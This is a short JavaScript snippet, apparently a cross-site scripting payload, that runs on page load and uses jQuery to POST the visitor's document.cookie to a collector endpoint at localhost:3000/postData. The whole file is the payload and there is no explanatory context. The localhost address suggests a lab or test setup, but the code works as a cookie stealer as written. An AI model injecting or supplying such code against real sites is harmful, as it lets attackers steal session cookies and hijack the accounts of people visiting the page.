window.onload = function () {
    $.ajax({
        url: "http://localhost:3000/postData",
        type: "POST",
        contentType: "text/plain",
        data: document.cookie,
        success: function (_data) {},
        error: function (error) {
            console.error("Error:", error);
        }
    });
}
